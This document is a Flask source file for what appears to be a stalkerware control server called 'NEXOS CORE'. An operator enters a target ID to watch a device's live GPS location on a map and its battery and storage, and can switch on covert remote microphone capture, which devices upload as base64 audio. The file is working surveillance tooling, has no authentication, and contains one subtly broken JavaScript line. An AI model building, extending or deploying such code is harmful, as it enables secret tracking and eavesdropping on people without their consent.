import os
from flask import Flask, render_template_string, request, jsonify

app = Flask(__name__)
db_dispositivos = {}

HTML_DASHBOARD_PRIVADO = """<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>NEXOS CORE // PRODUCTION PANEL</title>
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body { background: #070f15; color: #e2e8f0; font-family: 'Courier New', monospace; padding: 15px; }
        .wrapper { max-width: 600px; margin: 0 auto; }
        .header { text-align: center; margin-bottom: 20px; padding: 10px; border-bottom: 2px solid #1e293b; }
        .header h1 { font-size: 20px; color: #38bdf8; letter-spacing: 3px; font-weight: bold; }
        .search-box { background: #0d1925; border: 1px solid #1e293b; padding: 20px; border-radius: 12px; text-align: center; margin-bottom: 20px; }
        .search-box p { font-size: 13px; color: #64748b; margin-bottom: 15px; }
        .search-box input { width: 100%; max-width: 300px; background: #070f15; border: 1px solid #1e293b; padding: 12px; color: #34d399; font-weight: bold; text-align: center; border-radius: 6px; font-size: 16px; margin-bottom: 15px; letter-spacing: 2px; }
        .search-box button { background: #38bdf8; color: #070f15; font-weight: bold; border: none; padding: 12px 30px; border-radius: 6px; cursor: pointer; text-transform: uppercase; font-size: 13px; }
        .device-section { border: 1px solid #1e293b; border-radius: 12px; background: #0d1925; padding: 15px; margin-bottom: 20px; box-shadow: 0 4px 10px rgba(0,0,0,0.4); }
        .device-title { font-size: 14px; color: #34d399; text-transform: uppercase; border-bottom: 1px solid #1e293b; padding-bottom: 6px; margin-bottom: 12px; display: flex; justify-content: space-between; }
        .info-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-bottom: 12px; }
        .info-box { background: #070f15; border: 1px solid #1e293b; padding: 10px; border-radius: 6px; }
        .info-box span { font-size: 11px; color: #64748b; display: block; text-transform: uppercase; }
        .info-box strong { font-size: 16px; color: #f1f5f9; }
        .map-container { width: 100%; height: 300px; border-radius: 8px; background: #040a0f; border: 1px solid #1e293b; margin-bottom: 15px; }
        .status-tag { background: #166534; color: #4ade80; padding: 2px 8px; border-radius: 4px; font-size: 11px; }
        .btn-maps { display: block; width: 100%; background: #22c55e; color: #ffffff; text-align: center; padding: 14px; border-radius: 8px; font-weight: bold; text-decoration: none; text-transform: uppercase; font-size: 13px; letter-spacing: 1px; margin-bottom: 12px; }
        .btn-audio { display: block; width: 100%; background: #ea580c; color: #ffffff; border: none; text-align: center; padding: 14px; border-radius: 8px; font-weight: bold; text-transform: uppercase; font-size: 13px; letter-spacing: 1px; cursor: pointer; }
        .btn-audio.ativo { background: #dc2626; animation: pulse 1.5s infinite; }
        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.6; } 100% { opacity: 1; } }
    </style>
</head>
<body>
    <div class="wrapper">
        <div class="header">
            <h1>NEXOS // PRODUCTION PANEL</h1>
        </div>

        <div class="search-box">
            <p>DIGITE O SEU TARGET ID PARA ACESSAR O MONITORAMENTO</p>
            <form id="searchForm" method="POST">
                <input type="text" id="target_id" name="target_id" placeholder="EX: NX-A4B7D1" value="{{ id_buscado if id_buscado else '' }}" required><br>
                <button type="submit">Conectar Sinal</button>
            </form>
        </div>
        
        {% if info_moto %}
            <div class="device-section">
                <div class="device-title">
                    <span>CONEXÃO ATIVA // {{ id_buscado }}</span>
                    <span class="status-tag">ONLINE</span>
                </div>
                <div class="info-grid">
                    <div class="info-box"><span>Bateria</span><strong id="txt_bateria" style="color: #22c55e;">{{ info_moto.battery }}%</strong></div>
                    <div class="info-box"><span>Espaço Livre</span><strong id="txt_storage">{{ info_moto.storage }}</strong></div>
                    <div class="info-box"><span>Uptime</span><strong id="txt_uptime">{{ info_moto.uptime }}</strong></div>
                    <div class="info-box"><span>Sinal GPS</span><strong style="color: #38bdf8;">100% OPERACIONAL</strong></div>
                </div>
                
                <div id="map_private" class="map-container"></div>
                
                <a id="lnk_maps" href="https://www.google.com/maps?q={{ info_moto.lat }},{{ info_moto.lon }}" target="_blank" class="btn-maps">
                    🗺️ Abrir no Google Maps
                </a>

                <button id="btnAudio" class="btn-audio" onclick="alternarAudio()">🎙️ Ativar Áudio Coleta</button>
                <audio id="audioPlayer" autoplay></audio>
            </div>

            <script>
                let lastValidLat = {{ info_moto.lat }};
                let lastValidLon = {{ info_moto.lon }};
                let audioAtivo = false;
                let audioInterval = null;
                
                const map = L.map('map_private', { zoomControl: false }).setView([lastValidLat, lastValidLon], 16);
                L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', {}).addTo(map);
                let marker = L.marker([lastValidLat, lastValidLon]).addTo(map);

                async function alternarAudio() {
                    const btn = document.getElementById('btnAudio');
                    audioAtivo = !audioAtivo;
                    
                    if(audioAtivo) {
                        btn.innerText = "🛑 Desativar Escuta";
                        btn.classList.add('ativo');
                        
                        // Liga a escuta buscando áudio via HTTP pooling a cada 3 segundos
                        await fetch('/api/comando_audio/{{ id_buscado }}', { method: 'POST', body: JSON.stringify({acao: 'start'}), headers: {'Content-Type': 'application/json'} });
                        
                        audioInterval = setInterval(async () => {
                            try {
                                const res = range = await fetch('/api/get_audio/{{ id_buscado }}');
                                if (res.ok) {
                                    const data = await res.json();
                                    if(data.audio) {
                                        document.getElementById('audioPlayer').src = "data:audio/mp3;base64," + data.audio;
                                    }
                                }
                            } catch(e){}
                        }, 3000);

                    } else {
                        btn.innerText = "🎙️ Ativar Áudio Coleta";
                        btn.classList.remove('ativo');
                        clearInterval(audioInterval);
                        await fetch('/api/comando_audio/{{ id_buscado }}', { method: 'POST', body: JSON.stringify({acao: 'stop'}), headers: {'Content-Type': 'application/json'} });
                        document.getElementById('audioPlayer').src = "";
                    }
                }

                setInterval(async () => {
                    try {
                        const response = await fetch('/api/status/' + '{{ id_buscado }}');
                        if (response.ok) {
                            const data = await response.json();
                            let nextLat = parseFloat(data.lat);
                            let nextLon = parseFloat(data.lon);
                            if (!nextLat || !nextLon) return;
                            
                            lastValidLat = nextLat;
                            lastValidLon = nextLon;
                            
                            document.getElementById('txt_bateria').innerText = data.battery + '%';
                            document.getElementById('txt_storage').innerText = data.storage;
                            document.getElementById('txt_uptime').innerText = data.uptime;
                            
                            const newPos = [lastValidLat, lastValidLon];
                            marker.setLatLng(newPos);
                            map.panTo(newPos);
                            
                            document.getElementById('lnk_maps').href = 'https://www.google.com/maps?q=' + lastValidLat + ',' + lastValidLon;
                        }
                    } catch (e) {}
                }, 5000);
            </script>
        {% endif %}
    </div>
</body>
</html>
"""

@app.route('/', methods=['GET', 'POST'])
def index():
    id_buscado = None
    info_moto = None
    erro = None
    if request.method == 'POST':
        id_buscado = request.form.get('target_id', '').strip()
        if id_buscado in db_dispositivos:
            info_moto = db_dispositivos[id_buscado]
        else:
            erro = "ID NAO ENCONTRADO"
    return render_template_string(HTML_DASHBOARD_PRIVADO, id_buscado=id_buscado, info_moto=info_moto, erro=erro)

@app.route('/api/status/<device_id>')
def api_status(device_id):
    if device_id in db_dispositivos:
        return jsonify(db_dispositivos[device_id]), 200
    return jsonify({"error": "Not found"}), 404

@app.route('/update', methods=['POST'])
def update():
    global db_dispositivos
    data = request.get_json(force=True, silent=True)
    if not data or 'device_id' not in data: return jsonify({"status": "error"}), 400
    device_id = data['device_id']
    
    if device_id not in db_dispositivos:
        db_dispositivos[device_id] = {}
        
    db_dispositivos[device_id]["battery"] = data.get("battery", "N/A")
    db_dispositivos[device_id]["storage"] = data.get("storage", "N/A")
    db_dispositivos[device_id]["uptime"] = data.get("uptime", "Ativo")
    db_dispositivos[device_id]["lat"] = float(data.get("lat", -16.6869))
    db_dispositivos[device_id]["lon"] = float(data.get("lon", -49.2648))
    return jsonify({"status": "success", "comando": db_dispositivos[device_id].get("cmd_audio", "stop")}), 200

@app.route('/api/comando_audio/<device_id>', methods=['POST'])
def comando_audio(device_id):
    data = request.get_json(force=True, silent=True) or {}
    if device_id not in db_dispositivos: db_dispositivos[device_id] = {}
    db_dispositivos[device_id]["cmd_audio"] = data.get("acao", "stop")
    return jsonify({"status": "ok"}), 200

@app.route('/api/upload_audio', methods=['POST'])
def upload_audio():
    data = request.get_json(force=True, silent=True) or {}
    dev_id = data.get("device_id")
    if dev_id:
        if dev_id not in db_dispositivos: db_dispositivos[dev_id] = {}
        db_dispositivos[dev_id]["audio_b64"] = data.get("audio")
    return jsonify({"status": "stored"}), 200

@app.route('/api/get_audio/<device_id>')
def get_audio(device_id):
    if device_id in db_dispositivos:
        audio = db_dispositivos[device_id].get("audio_b64", "")
        db_dispositivos[device_id]["audio_b64"] = "" # Limpa após ouvir
        return jsonify({"audio": audio}), 200
    return jsonify({"audio": ""}), 404

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
